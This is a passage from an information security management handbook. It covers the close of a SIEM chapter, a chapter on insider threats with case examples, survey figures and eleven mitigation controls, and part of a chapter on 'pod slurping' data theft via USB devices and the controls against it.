Finally, it is important to realize that SIEM tools are potentially higher than average 
targets of attack for two reasons: they are, in many ways, the cornerstone of security 
threat detection, and evidence of malicious activity, evidence that could lead to the 
identification and even arrest of perpetrators, resides within them. Accordingly, 
these tools should be afforded a higher level of protection than most other servers 
within an organization’s IT environment. SIEM tools and the systems on which 
they reside should be subjected to regular vulnerability analyses, penetration test-
ing, and security audits, and any deficiencies and vulnerabilities found should be 
promptly mitigated.
9.7  Conclusion
The use of SIEM technology is growing so rapidly that it is becoming a staple 
item in organizations’ information security practices. The functionality that SIEM 
technology offers is broad to the point that it is bound to meet at least a number 
of the needs of every organization that uses it. But this technology is not a “plug 
and play” technology; considerable planning as well as customization is necessary 
if it is to produce maximum benefits for an organization. Gaining a true under-
standing of this technology and its associated benefits and downsides is essential. 
Choosing the particular SIEM product that best meets your organization’s business 

126  ◾  Information Security Management Handbook
and operational needs is not easy, so developing appropriate selection criteria and 
using an objective, systematic process to evaluate each candidate product is neces-
sary. SIEM technology constitutes one of the true information security technology 
breakthroughs in the last few years. If your organization is not yet using SIEM 
technology, the benefits presented in this chapter should serve as an impetus for you 
to seriously consider using it.

127
10
Chapter 
The Insider Threat: 
A View from the Outside
Todd Fitzgerald
10.1  Introduction
Knock, knock. Who’s there? My friend. My friend, who? My friend, 
you are about to trust no one.
When we think of the words “insider threat,” most of us tend to cringe. Even as 
security officers, often we don’t want to talk about it. It is human nature to want 
to believe that the threats that we face are outside of our own organization, and 
that the enemy is “them” and not one of “us.” As individuals, we are part of many 
groups in society including the companies we work for, professional associations, 
Contents
10.1	 Introduction..............................................................................................127
10.2	 It’s Real, Really!.........................................................................................128
10.3	 The Numbers............................................................................................130
10.4	 US-CERT Insider Threat Survey..............................................................131
10.5	 Other Types of “Insider” Threats...............................................................132
10.6	 Learning from the Outside Threats...........................................................133
10.7	 11 Ways to Mitigate the Risk....................................................................133
10.8	 Final Thoughts..........................................................................................136
Further Reading.................................................................................................136

128  ◾  Information Security Management Handbook
volunteer groups, religious organizations, multiple groups of friends with different 
interests, and the group we spend the most time with in our lives, our families. It 
is disconcerting to believe that any member of the groups to which we belong by 
choice would expose us to bad behavior or that we cannot trust the members of 
the groups to which we have chosen to belong. After all, we choose these groups to 
provide a certain level of safety, security, and comfort within our lives.
So why is it important and why should we even care about the group dynamics 
with respect to the insider threat? One reason: complacency. When we belong to 
these groups and interact on a daily basis, we tend to get a false sense of comfort 
with the individuals who we are dealing with. Individuals show their “best face” to 
the organization, the one that will
	
1.	Enable them to work on rewarding projects
	
2.	Provide a path to promotion
	
3.	Create long-term job security
	
4.	Appreciate their contributions to the organization
There is much that is unknown about the employees who we work with, other 
than the face that is shown to us as they show up for work. We perform background 
checks on individuals as they enter the workplace; however, these are typically not 
very extensive, limited geographically, limited to serious criminal offenses, and may 
not provide enough real information about the individual. Organizations typically 
do not reinvestigate the individuals very frequently either, and changes in their 
economic situation, which could create a new motive for the individual for criminal 
activities, would not be caught.
10.2  It’s Real, Really!
The insider threat can’t happen to your organization? Good, hard-working people are 
employed there? Consider the following scenarios, each of which was a real incident:
The financial division manager for a parking authority was responsible for 
◾
◾
handling disputes regarding parking tickets. Due to the lack of sound busi-
ness controls, it was easy for him to mark the tickets as voided in the system 
and pocket the money collected for fines, reducing the amount collected in 
the system, and keeping the difference.
Food stamps were provided in excess of the entitled allotment in return for 
◾
◾
a certain number of food stamps, which were kept. This fraud cost $70,000 
in 53 cases as a result of an “expedited procedure” whereby the supervisor 
approval and other personal information was not required.
Two motor vehicle department employees colluded to overcome the segre-
◾
◾
gation of duties policies whereby the driver’s license information was to be 

The Insider Threat: A View from the Outside  ◾  129
entered by a clerk and verified by a manager before it became effective. The 
two employees placed pictures of themselves and fake addresses to obtain 
credit cards in their victim’s names, subsequently purchasing $255,000 of 
cars and merchandise.
A federal court sentenced Yung-Hsun “Andy” Lin, a former systems adminis-
◾
◾
trator for Medco Health Solutions Inc., to 30 months in prison for planting a 
logic bomb to delete data stored on the Medco network. He was also ordered 
to pay $81,200 in damage he caused to the computer systems.
A front-desk operator stole information on 1100 patients to sell to a cousin to 
◾
◾
submit fraudulent Medicare claims.
The North Carolina Court of Appeals is allowing the use of the Health 
◾
◾
Insurance Portability and Accountability Act (HIPAA) as the standard of 
care in a lawsuit whereby an office worker used a clinic owner’s account and 
password to look up patient information.
An IT professional at a military base encrypted files upon learning that she 
◾
◾
would be downsized. She offered the system administrator that she would 
decrypt the files in exchange for a $10,000 “severance offer,” and the sys-
tem administrator accepted before consulting with the proper authorities. 
Prosecutors determined that they could not pursue charges upon reviewing 
the case.
An engineer at an energy processing plant became angry with his new, nontech-
◾
◾
nical supervisor and had several outbursts. His wife was terminally ill, and he 
was sent home due to the work disruptions. The staff discovered some unusual 
modifications to the control systems, and he refused to provide the password 
to the engineers, threatening the productivity and safety of the plant.
The general manager of the GE nuclear facility in Wilmington, North 
◾
◾
Carolina, received an extortion letter with a sample of uranium dioxide pow-
der. The letter stated that the writer had two five-gallon containers of low 
enriched uranium dioxide that had been taken from the plant. The containers 
were identified in the letter by serial number and were subsequently authenti-
cated as being missing from the plant. The letter demanded $100,000 or else 
the material would be dispersed in an unnamed U.S. city. An employee of a 
subcontractor was arrested and sentenced to 15 years in prison.
A grand jury in San Jose, California, handed down separate indictments 
◾
◾
for two men at NASA for downloading child pornography to government 
computers. If convicted, the men face a maximum sentence of ten years 
imprisonment and a fine of $250,000 and will be required to register as sex 
offenders.
The aforementioned incidents illustrate that the insider threat is real across 
industries, public and private companies, and large and small organizations. These 
incidents arise from a multitude of motivations and, as with any crime, only certain 
percentages of the total activity are actually detected.

130  ◾  Information Security Management Handbook
10.3  The Numbers
Most individuals who show up to the workplace are honest, trustworthy individu-
als trying to create a living and provide for their families. This group is not the 
group that we should be concerned with. It is the minority of individuals who have 
the motivation to steal from the employer that we are concerned with. So how 
many people are we talking about? One or two? A few? A couple dozen? Herein 
lies the problem—we just don’t know! Let’s assume for a moment that 95 percent 
of individuals who show up for work every day are hard-working, honest citizens 
who would never think of harming their employer for any reason. Let’s also assume 
that, of this 95 percent of individuals, 100 percent of them perform their jobs com-
pletely, without any errors, and follow the security policies 100 percent of the time. 
Feeling a little queasy about this 95 percent number now? Well, let’s continue the 
example anyway. So, if we have 50,000 employees in our company, and we don’t 
have to worry about 95 percent of them, that means that we still have 5 percent, 
or 2500 employees, that we do need to worry about protecting the environment 
from. Furthermore, these individuals are inside the perimeter of the company, with 
authorized log-in accounts, access to the physical facility, and they may have man-
agement approval for privileged access, and visit the facilities every day of the week. 
Now we have an issue that is real and needs to be discussed.
The actual numbers of insider threats are difficult to determine, as within orga-
nizations this has typically not been a focus area, and external studies that have 
been done tend to focus more on the activities concerning fraudulent activities and 
less on the “mistakes” that are made by people inside the organization. Moreover, 
the willingness of organizations to disclose the insider threat activity is limited 
unless there is a requirement to disclose by law. For example, security incidents 
involving personal information must be disclosed to the impacted parties under 
California Senate Bill 1386; however, the exact particulars of the breach, such as 
the activity that created the disclosure, do not have to be reported to the consumer. 
Organizations are unlikely to state that “employee Jane Smith did a stupid thing by 
putting the names, addresses, and health information of our patients on a Website 
because she was in a rush to get the application upgraded on a Friday afternoon.” 
The company could potentially open itself up to legal trouble with the associate 
as well as having to endure difficult employee relations with other employees as a 
result. They may indicate the activity that occurred or that there was an inadvertent 
disclosure while retaining some of the details.
Even in today’s climate of “loyalty = you work, you get paid, and we start over 
again next week” mentality between corporations and individuals, companies still 
want to be viewed by their employees as being trustworthy when dealing with them 
and looking out for their care. This is the reason that, to some organizations, the 
mere ”thought” of starting to look into individuals’ work affairs smells of the ”big 
brother” image that corporations want to avoid. Consider, for the sake of example, 
the case of voluntary terminations. Once an individual has provided his resignation 

The Insider Threat: A View from the Outside  ◾  131
notice, how many organizations walk the individual out the door immediately and 
say, “thank you for all you have done”? No, the typical practice, which is even 
encouraged by the organization, is to honor the two-week notice provided by the 
associate and let the person continue to work in the building until his or her last 
day! As an organization, we assume the departing associate is trustworthy and not 
downloading confidential customer lists, strategies, pricing guides, employee ros-
ters, financial or health records, etc. We also assume the person is not doing dam-
age to files and the backups that he or she has access to, planting backdoors/logic 
bombs/malware on the system, and wreaking havoc with whatever he or she has 
access to. Maybe the person is leaving because a contract has been lost, did not get 
a promotion, or is disgruntled for another reason. And yet, because organizations 
want to be seen as a good company to work for by the other employees, they want 
to maintain an aura of respect for the departing associate. Although there is some 
merit to this view, and walking the person out the door immediately may be viewed 
as an extreme situation to be held only for involuntary terminations, there needs to 
be a balance in mitigating the risk of an insider threat.
10.4  US-CERT Insider Threat Survey
The U.S. Secret Service and the Software Engineering Institute’s CERT program at 
Carnegie-Mellon University produced two 2008 reports on the insider threat, includ-
ing “Illicit Cyber Activity in the Government Sector” and “Illicit Cyber Activity in the 
Information Technology and Telecommunications Sector.” The report was focused 
on the insider threats, which occurred as a result of fraudulent activity and really did 
not address the threats caused by carelessness of employees and contractors.
The survey reviewed 149 cases between 1996 and 2002 across 12 of the critical 
infrastructures, leveraging Secret Service case files. For the government sector, 36 
incidents conducted by 38 insiders (employees, contractors, or former employees 
and contractors) resulting in 21 cases of fraud (13 of which were financial fraud), 
nine cases of sabotage, three theft of confidential information, and three involving 
both theft and sabotage were identified. The organizations impacted included child 
and family support services, motor vehicle registration, and police, judicial, and 
assorted government agencies.
From the cases reviewed, the study makes the following observations and 
conclusions:
There were no statistically significant common demographics of race, gender, 
◾
◾
or age that could be determined.
The majority (58 percent) of the insiders were current employees in admin-
◾
◾
istrative and support positions, which required limited technical skills, with 
50 percent of those assigned to leadership or supervisory roles. Those with IT 
technical skills made up 26 percent of the insiders.

132  ◾  Information Security Management Handbook
Nearly half of the insiders exhibited some inappropriate behavior that was 
◾
◾
noticed by others prior to the incident. These behaviors included calling in 
sick frequently, leaving work early, demonstrating a poor attitude, and engag-
ing in arguments with other employees.
A significant number of insiders (84 percent) had no previously recorded inci-
◾
◾
dents or violations of organization policies.
A majority of the motivation was financial gain (54 percent), and those moti-
◾◾
vated by revenge (24 percent) included incidents of sabotage (67 percent), theft of 
confidential information (11 percent), and events including both (22 percent).
In over 56 percent of the cases, specific events triggered the incident, with a 
◾
◾
single incident potentially being the result of multiple events, such as:
Termination, demotion, transfer, other disciplinary action (40 percent)
−
−
Financial hardship or bribe (40 percent)
−
−
Personal problem unrelated to organization (15 percent)
−
−
Dispute or dissatisfaction with management (10 percent)
−
−
Other events (5 percent)
−
−
Authorized access was used most of the time (56 percent) using access control 
◾
◾
gaps (69 percent) to facilitate the incidents. Access exceeded what was needed 
to perform their jobs.
Most of the insiders planned their activities in advance.
◾
◾
In 58 percent of the cases, they used their own account, and in 42 percent of 
◾
◾
the cases they used someone else’s account, such as a system administrator, 
expired, other employees, shared, or an account on another employee’s com-
puter without a screen lock.
Most of the insiders that were detected did not understand the severity of their 
actions or the financial impact that was caused. The study is useful, in that it high-
lights the motivations, techniques to commit the activity, and the types of indi-
viduals and behaviors that were exhibited. Detection of the activity is difficult, as 
many times insider activity is a “silent crime” in that the disgruntled employee who 
has an axe to grind will want to do this in a manner that avoids detection.
10.5  Other Types of “Insider” Threats
Much of the discussion of insider threats refers to malicious intended behavior; 
however, the insider threat as a result of accidental or careless action, or a lack of 
understanding of the security policies should also be regarded as the “insider threat.” 
Someone leaving a laptop in a car, or e-mailing/improperly disposing of personal 
confidential information can have consequences that are just as serious as the mali-
cious insider threat. This discussion is primarily focused on the insider threats that 
are the result of intentional, malicious actions to cause harm to the organization.

The Insider Threat: A View from the Outside  ◾  133
10.6  Learning from the Outside Threats
By this point it should be very clear that these events do happen within organiza-
tions where individuals have the motive, opportunity, and means to carry out the 
threat. It is difficult to get a handle on what the real magnitude of the problem may 
be for any one particular company or industry; however, there are certain steps 
that can be taken to mitigate the risk. Whatever the number of actual incidents, 
it should be clear that the problem does exist and an organization needs to have a 
thought-out, defined approach.
Much of the discussion at security conferences is focused on protecting the 
perimeter, the endpoints, and the remote access capabilities to prevent an external 
party from accessing the internal systems. The conversations tend to focus on the 
hackers “out there” versus the individuals with authorized access within the orga-
nization. Firewalls, intrusion detection systems, encrypted network traffic/e-mail, 
and physical security devices are discussed to prevent and detect entry. As the old 
adage goes, an organization is typically hard and crunchy on the outside and soft 
and squishy on the inside, like an M&M. Many of the security principles that we 
apply to protect the information from the external world, if implemented correctly, 
also go a long way to protect the threats from our own employees and contractors. 
For example, ensuring that baselines containing only the necessary services are 
developed for devices such as servers, routers, and switches, ensuring that baselines 
are applied consistently to all servers, and that the configurations are monitored on 
a regular basis, help to protect the internal computing environment from the out-
side. These same configurations and associated monitoring that reduce the impact 
of the outside threat also serve to limit the internal damage and detect the inside 
threat. Let’s review some of these controls and other considerations for reducing the 
insider threat risk.
10.7  11 Ways to Mitigate the Risk
Short of monitoring an employee or contractor’s every move with surveillance cam-
eras, there are steps that can be taken to reduce the risk. Each organization has 
to decide how much loss it is willing to tolerate, as each of these areas requires an 
investment—in some cases substantial investments that may outweigh the ben-
efits. Even with these controls in place, there will still be the residual risk of user 
carelessness or of those angry users who are determined to circumvent the system. 
Thoughtful implementation of some or all of these controls can deter, prevent, 
detect, or reduce the ultimate impact of the incident.
Deliver security policy by management: The tone at the top is essential for all 
◾
◾
security programs, as the more the employees understand that management 

134  ◾  Information Security Management Handbook
expects that the security policies must be complied with and that they are not 
just the product of the information security department, the less the likeli-
hood they will believe that a violated business process or that a circumvented 
security process will go undetected.
Communicate insider threats through security awareness programs: Security 
◾
◾
awareness programs communicate the key reasons why the security policies 
exist and the consequences for not following them, such as disciplinary action 
up to and including termination. Sanctions must be enforced. Providing 
examples of where insider activity had occurred and where the internal IT 
security departments and management had detected the activity, terminated 
the employee, and successfully prosecuted the individual could serve as a 
deterrent to others contemplating such activity. To avoid potential issues for 
the company, unless the case presented was public information, the names or 
any identifying information involved in the incidents should not be commu-
nicated. This can be an effective approach as it communicates that incidents 
do happen within the organization, and monitoring activities are in place and 
management attention will detect this type of activity.
Conduct pre-employment screening: Pre-employment background and refer-
◾
◾
ence checks can uncover prior criminal records, credit problems, or issues 
with character. They can also serve as a deterrent for individuals, some of 
who may not even apply in the first place if they are aware that a background 
check is required.
Pay attention to performance issue handling: In many cases, there is a job-
◾
◾
related event that triggers an employee to take action. Anger may fuel the 
need for the disgruntled employee to take action, either while still with the 
company or planned for soon after departure. Employees should have a venue 
to address their concerns, complaints, and dissatisfaction and obtain the feel-
ing that they are being listened to. Managers also need to be trained to han-
dle performance review issues skillfully. When performance issues do occur, 
appropriate documentation needs to be maintained to permit tracking of the 
behavior over time.
Enforce separation of duties and need-to-know access: Effective separation of 
◾
◾
duties ensures that access to critical information and functions are not held 
by the same individual. Checks and balances implemented through review 
and approval processes are consistently applied so that gaps, even in “emer-
gency” situations, are appropriately controlled and reviewed. For example, 
permitting someone to enter purchase orders and make payments against 
those orders can lead to bogus, undetected entries. If appropriate segregation 
of duties is implemented, this reduces the risk because collusion of two or 
more parties is necessary to commit the fraud. In situations where it is nec-
essary to have one person perform the function due to limited staff, regular 
management review and sign-off processes may be implemented.

The Insider Threat: A View from the Outside  ◾  135
Implement strict password and account policies: These are the keys to the 
◾
◾
online activity of the employees and contractors and unless this is sufficiently 
controlled through appropriate account provisioning, adequate password 
complexity requirements, policies prohibiting sharing, and management of the 
passwords through secure means, the entire system can be circumvented.
Monitor employee actions: Events performed by employees need to be logged 
◾
◾
and the logs need to be reviewed for abnormal behavior. If the appropriate 
controls have been put in place in the assignment of the accounts and pass-
words as previously noted, then the actions of the employee can be accurately 
associated to the events shown on the logs. Security information manage-
ment tools can aggregate the logs and provide deeper inspection by setting up 
rules for the anomalies.
Pay increased attention to privileged accounts: Systems administrators have 
◾
◾
elevated access through the use of privileged accounts. If a system administra-
tor who has the capability to alter or delete the log entries commits the fraud, 
detecting the event will be more difficult, if even possible. Special monitoring 
should be applied to these accounts due to the damage that can be caused.
Implement a rigorous termination process: The organization must define all 
◾
◾
the accesses that could potentially be granted to an employee and contractor. 
A solution that ensures the system and physical access is terminated imme-
diately following the termination must be implemented. Typically, physical 
and system access termination will involve coordination of individuals from 
multiple departments such as Human Resources, identity and access man-
agement (security administration), physical security, network infrastructure, 
outsourced data centers, systems administrators, and so forth. The process 
must include rapid notification, confirmation, and subsequent auditing to 
ensure the individuals are terminated promptly.
Maintain backup and recovery: Backup and recovery represent corrective 
◾
◾
controls in the event that the insider is successful in bypassing the other 
controls. This becomes the last line of defense to get the organization’s files 
back to the normal state. The backup needs to be secured and tested to be 
useful. Technically savvy attackers may also contaminate the backups for 
multiple generations by changing information just prior to the backups, and 
then changing it back. When the attack is performed several weeks later, the 
attacker has already changed the information written to the backup tapes, 
rendering the restore ineffective.
Invest in forensic procedures: A variety of forensic tools in an organization’s 
◾
◾
toolkit increase the capability to analyze what the employee or contractor 
has been doing with the company assets. Files may be deleted and unrecov-
erable through normal means, but are accessible through the forensic tools. 
Court-presentable evidence can then be provided in the event the case is 
prosecuted.

136  ◾  Information Security Management Handbook
10.8  Final Thoughts
The insider threat issue must be attacked with people, process, and technology 
through a defense-in-depth strategy. If the systems are maintained according to the 
security configurations necessary, duties are segregated, accounts and passwords 
are controlled, and employees are made aware that their actions are being logged 
and monitored, there is less likelihood that a disgruntled employee will attempt the 
unwanted activity. On the flip side, if it appears that management is not involved, 
the systems are wide open, and it is easy to utilize another account through lax 
policies, there may be a perception that getting caught is less likely. It is funny 
how people slow down when approaching a police officer parked by the side of the 
freeway, only because he “might” have the radar gun recording their actions. If the 
police announced that they never ticket anyone on that section of the freeway, what 
might our driving habits be like?
As stated previously, most employees and contractors are trustworthy and con-
tribute their energy every day toward the company mission. However, unexpected, 
disappointing events can cause individuals to perform criminal activities, and they 
are sometimes unaware of the magnitude or the consequences of their actions. To 
provide adequate information assurance, special attention to the insider threat 
should be built into our security programs.
Further Reading
Herold, R. April 2008. 20 ways to mitigate the 3 types of insider threats: Part 2 of 2. Alert, 
Computer Security Institute.
Shaw, E.D., Ruby, K.G., and Post, J.M. The Insider Threat to Information Systems. Political 
Psychology Employees, Ltd. http://rf-web.tamu.edu/security/SECGUIDE/Treason/
Infosys.htm.
Hirsh, D. The Truck Bomb and Insider Threats To Nuclear Facilities. Nuclear Control 
Institute. http://www.nci.org/g-h/hirschtb.htm#ENDBACK18.
Gaudin, S. 2007. NASA workers indicted for having child porn on work computers. 
Information Week, October 3.
Cappelli, D., Moore, A., and Shimeall, T. 2005. Common Sense Guide to Prevention and 
Detection of Insider Threats. US-CERT.
U.S. Security Service. January 2008. Insider Threat Study: Illicit Cyber Activity in the 
Government Sector. CERT Software Engineering Institute, Carnegie-Mellon.
U.S. Security Service. January 2008. Insider Threat Study: Illicit Cyber Activity in the 
Information Technology and Telecommunications Sector. CERT Software Engineering 
Institute, Carnegie-Mellon.

137
11
Chapter 
Pod Slurping
Ben Rothke
11.1  Introduction
If data leaving organizations made a sound, most CIOs and CISOs would need 
noise cancelling and noise reduction headphones. Far too much data leaves organi-
zations and the situation is only getting worse. In a survey conducted by McAfee, 
55 percent of respondents said they use a portable device to take confidential docu-
ments out of their business every week.*
The oft-quoted observation about Chicago life, “if you don’t like the weather, 
wait five minutes,” is in many ways descriptive of the nature of information secu-
rity. Issues not envisioned today become the significant threats of tomorrow.
Consider the cost of hard drives.† In 1987, a megabyte of disk space was $43.70. 
In 1992, the cost was $18. A decade ago, hard-drive pricing moved from megabyte 
to gigabyte; of which 1 gigabyte was $228.57. Five years ago, the cost was $3.88 per 
*	McAfee, The Threats Within, Volume II: Data Loss Disaster. February 2007.
†	 http://www.mattscomputertrends.com/harddiskdata.html.
Contents
11.1	 Introduction..............................................................................................137
11.2	 USB Versions............................................................................................139
11.3	 How Does Pod Slurping Work?................................................................140
11.4	 USB Data Leakage....................................................................................141
11.5	 Security Threats and Countermeasures.....................................................141
11.6	 Products....................................................................................................144

138  ◾  Information Security Management Handbook
gig, and in early 2008, it was $1.23 per gig. Costs are so low that 4-gigabyte thumb 
drives are given away at industry conferences and store openings.
The dramatic drop in storage pricing enabled the development and affordability 
of MP3 devices, among other technologies. Other benefits have been huge. But 
with those benefits comes some significant security issues.
It was not that long ago that if you wanted to take 100,000 files out of corporate 
headquarters, you would need to make hundreds of trips with a handcart to a semi-
trailer in the parking lot. Such an exercise would clearly raise numerous eyebrows 
and take days to complete.
Today, downloading a million files to a mass storage device can easily be done. 
This has given birth to the term “pod slurping.” Pod slurping is defined* as the 
act of using a portable data storage device (such as an iPod digital audio player) 
to download large quantities of confidential data illicitly. This is done by directly 
plugging the device into a computer or network where the data is held, which often 
may be on the inside of a firewall. As these storage devices become smaller and their 
storage capacity becomes greater, they are becoming an increasing security risk to 
companies and government agencies.
All of these removable media provide a lot of useful purposes, but they also pose a 
significant threat to an organization. Their small size combined with enormous storage 
capacity makes it all too easy for confidential customer data and intellectual property 
to walk right out the front door and fall into the wrong hands through loss or theft.
There has been some work in the development of fixes to the problem, including a 
number of third-party security products that allow companies to set security policies 
related to USB device use, and features within operating systems that allow IT admin-
istrators or users to disable the USB port altogether. UNIX/Linux systems can easily 
prevent users from mounting storage devices, and Microsoft has released instructions 
for preventing users from installing USB mass storage devices on Windows-based 
systems (Windows 2000 and later).† In Windows, an administrator can also disable 
USB access via the Windows Group Policy and an ADM template.
The problem, though, with such an approach is that it does not offer any sort of 
granular control. Either one enables access to the USB port or denies it. The issue is 
that most users need some sort of USB access for their peripherals (printers, PDAs, 
etc.), which makes deployment of this control infeasible.
The following table details what data is being pilfered and the reasons insiders 
are doing it:
What is being stolen
Why it is being stolen
Risks
Blueprints
Intellectual property 
resale
Consumer outrage
*	http://en.wikipedia.org/wiki/Pod_slurping.
†	 http://support.microsoft.com/default.aspx?scid=kb;en-us;823732.

Pod Slurping  ◾  139
What is being stolen
Why it is being stolen
Risks
Engineering plans
Malicious intent
Embarrassment
RFP data
Monetary gain
Regulatory scrutiny
Salary charts
Revenge
Fines
Price lists
Curiosity
Civil/criminal convictions
Source code
Disgruntled employee
Database schemas
Intellectual property
Corporate directories
In conclusion, research firm Gartner* has advised companies to take action 
against the risks that portable storage devices present to the enterprise. Businesses 
are increasingly putting themselves at risk by allowing the unauthorized and uncon-
trolled use of portable storage devices. Gartner notes that USB flash drives, MP3 
players, and the like are everywhere nowadays, and giving your staff free rein to use 
them at work could lead to breaches of security and loss of data.
11.2  USB Versions
A quick overview of the various versions of USB is in order. The design and proto-
cols of USB are standardized by the USB Implementers Forum† (USB-IF). USB-IF 
is a nonprofit corporation founded by the companies that developed the USB speci-
fication. USB-IF was formed to provide a support organization and forum for the 
advancement and adoption of USB technology. The forum facilitates the develop-
ment of high-quality, compatible USB peripherals and promotes the benefits of 
USB and the quality of products that have passed compliance testing.
Version 1.0 of USB was released in January 1996. It had a specified data rate 
of 1.5 megabits per second (low-speed) and 12 megabits per second (full speed). A 
significant upgrade was released in September 1998 with version 1.1. USB 2.0 was 
released in April 2000 and had numerous enhancements. The main enhancement 
was the added higher maximum speed of 480 megabits per second (now called 
hi-speed). USB 3.0 is currently in development and is targeted at ten times the 
current bandwidth, reaching roughly 4.8 gigabits per second by utilizing two addi-
*	http://www.csoonline.com/analyst/report2714.html.
†	 www.usb.org. 

140  ◾  Information Security Management Handbook
tional high-speed differential pairs for Superspeed mode, and with the possibility 
for optical interconnect.
In March 2008, eWeek advised readers* that slow USB version 1.1 devices (mainly 
hubs) may be hidden productivity robbers lurking in an organization and suggested 
upgrading these USB hubs to version 2.0. From a security perspective, this means 
even quicker download data speeds and an increased risk of pod slurping.
11.3  How Does Pod Slurping Work?
When the storage device connects to a Windows host, it appears as another storage 
device. In Figure 11.1, a 4-GB USB drive is mounted as the “G” drive. If someone 
wants to copy data to this G: drive, they can simply use the Windows command 
line or Windows Explorer.
For the more nefarious types, they will use specialized tools or scripts. Abe 
Usher created a utility that clearly demonstrates exactly how quickly and easily 
someone with privileged access can steal data using an iPod or similar portable 
*	http://www.eweek.com/c/a/Infrastructure/10-Products-and-Processes-That-Should-Be-Put-
Out-To-Pasture/4/. 
Figure 11.1  A 4-GB USB drive is mounted as the “G” drive. If someone wants 
to copy data to this G: drive, he can simply use the Windows command line or 
Windows Explorer.

Pod Slurping  ◾  141
storage device.* This slurp.exe program is capable of copying 100 MB worth of 
data from the Windows Documents and Settings directory in minutes. It can copy 
roughly 20,000 files an hour from any computer that it is connected to.
In writing slurp.exe, Usher’s goal was to demonstrate the significant vulner-
ability of current information security protection schemes around such data. He 
demonstrated the program on a test box, and it was able to copy all of his document 
files onto his iPod in 65 seconds.
Usher did his demonstration as a proof of concept. But organizations indeed 
have nefarious insiders who will try to get the data for their own purposes. And 
once the information is slurped, it is owned by the data holder. At that point, it can 
be used for whatever the user wants to do with it.
11.4  USB Data Leakage
The average corporate desktop build now comes with four to eight USB ports, with 
laptops having two to four USB ports.† Some may be used for mice or keyboards, 
printers, tokens, and the like. That leaves the remaining ports open for whatever the 
user wants to do with them. This openness is based on the fact that USB ports are 
by default in an always-on mode, which renders any device plugged into the port 
open and able to make use of the USB connection.
As stated earlier, one can disable USB connectivity via the Windows Group 
Policy and an ADM template. The problem, though, is that there is no granular 
level of control here; the port is either on or off.
USB port control native to Windows XP/Vista is quite limited. One can disable 
ports or render them read-only, but finer control over allowed devices or file types 
is lacking. This is a problem given that most end users will require USB for some 
required peripherals. This renders such Windows Group Policy and an ADM tem-
plate controls mute. As we will see later, there are a number of third-party applications 
that can give you control over USB ports with the required levels of granularity.
11.5  Security Threats and Countermeasures
In truth, pod slurping extends to any removable media and is a significant informa-
tion security threat. An iPod, USB, flash, PDA, or Bluetooth-enabled device can be 
used to download confidential and proprietary corporate data.
What makes pod slurping so effortless is the plug-and-play functionality built 
into the Windows operating system. Plug a USB device into most computers and 
an attacker can start downloading gigabytes of data in under a minute.
*	http://www.sharp-ideas.net/archives/2005/06/pod_slurping.html.
†	 Many vendors at conferences now give away free mini-USB ports. This turns one available port 
into four available ports, thus quadrupling the potential risk.

142  ◾  Information Security Management Handbook
Gartner notes that these storage devices pose two kinds of threat:
	
1.	Intentional/unintentional: Users can bypass perimeter defenses like firewalls 
and anti-virus at the mail server, and introduce malware such as Trojan horses 
or viruses that, if not discovered, can cause serious damage.
	
2.	Data loss: Companies are at risk of losing intellectual property and other 
critical corporate data. Portable storage devices are ideal for anyone intend-
ing to steal sensitive and valuable data. Employees may also be responsible for 
losing data if they inadvertently mislay these devices.
Gartner goes on to note that the impact of the latter goes beyond the commer-
cial value of the data for two reasons:
	
1.	Different privacy laws in different countries: This means there is more risk of 
legal action if personal information belonging to corporate clients or employ-
ees ends up in the hands of an unauthorized third party.
	
2.	Reputational risk: Companies’ reputations may be damaged as a consequence 
of information leaks. This is particularly the case for those operating in areas 
where client privacy must be preserved, such as the financial market.
The security challenge around pod slurping is that the attacker is often a trusted 
insider. Pod slurping is based on the premise that the person has physical access to a 
device. And a key point to realize about security is that nearly every operating system, 
from UNIX to Linux to Windows and more, all place the foundation of their security 
architecture at the physical level. Unfortunately, physical security has long been an 
afterthought when it comes to desktop computers. Such consequences can leave desk-
tops wide open to a slurping-based security attack. Also, firewalls, IDS/IPS, NAC, 
and anti-virus software are for the most part useless against pod slurping.
The iPod is the archetypal example of the mass storage device used in such an 
attack. The iPod is the ultimate in simplicity as from the outside, it appears to be an 
innocuous MP3 player. But underneath its cool exterior is a device that can store 
up to 160 GB* of data; 160 GB is large enough to store all the corporate data found 
in many organizations. What this means is that a malicious insider can steal huge 
amounts of proprietary data during the course of a work day.
When one combines the raw data storage of an iPod with the transfer speeds of 
USB (USB 2.0 has a raw data rate at 480 Mbps, which is 40 times faster than the 
USB 1.1 standard), massive amounts of data can literally fly off the network. The 
truth is that the transfer speed of 480 Mbps is not practical. Effective transfer rates 
are usually in the range of 40 Mbps for bulk transfer on a USB 2.0 hard drive with 
no one else is sharing the bus. Either way, that is still a lot of data moving.
*	By the time you read this, the 160 GB figure will likely be doubled. This clearly illustrates the 
increase in disk sizes. In under a decade, terabyte iPods will easily be attainable.

Pod Slurping  ◾  143
A knee-jerk reaction to the pod slurping problem would be simply to ban such 
devices in corporate environments. But such an approach is often not practical given 
that these same devices are part and parcel of a standard IT environment. A total ban of 
iPods is not a good approach given that most organizations lack any sort of enforcement 
for such an approach. But more importantly, users are notorious for bypassing such 
requirements. Ultimately, one does not want to rely on end users for enforcement.
It has been written in many places that one way to block an unauthorized USB 
port is to inject epoxy glue into it. But neither this writer nor any of his colleagues 
has seen this done in any corporate environment. Also, doing that to leased hard-
ware can create a situation where penalties must be paid for the destroyed parts.
Ultimately, the most effective way to secure data is via technological means. 
This is not the place to mention specific vendors (see Section 11.6), but what is 
needed is a solution that gives a data owner total control over data transfers to and 
from portable storage devices on a user-by-user basis throughout the network.
Some requirements for an enterprise-grade product are shown in the follow-
ing table:
Requirement
Details
Granular control of USB access
Can both deny all access or provide various 
levels (read-only/full authorized access)
Granular control of USB device
Can block or allow as per device (printer, 
mouse, keyboard, etc.)
Configurable by security 
administrator
Appropriate security levels to ensure only 
admin can make changes
Support various media
USB, FireWire, IDE, Bluetooth, etc.
Centralized management
A typical network will have thousands of USB 
ports and you need to be able to manage all 
of them in a single central location
E-mail alerts
Configured for administrator-defined events
Rule based 
Enables the administrator to create a set of 
rules on the workstation to control 
applications and devices; allows only 
authorized devices to be used and bars 
access to unauthorized ones
White list support
A white list allows you to authorize only 
specific devices that will not be locked 
regardless of any other settings; the goal is 
to allow certain authorized devices, but lock 
all other devices

144  ◾  Information Security Management Handbook
Requirement
Details
Logging
Software can log all of the users’ actions and 
keep track of access denied (read/write), 
new device entered, by whom, when, on 
what host, etc.
Encryption
Ability to encrypt devices with strong 
encryption enables protection of data 
stored on removable media
Restrict amount of data copied
Ability to restrict the daily amount of data 
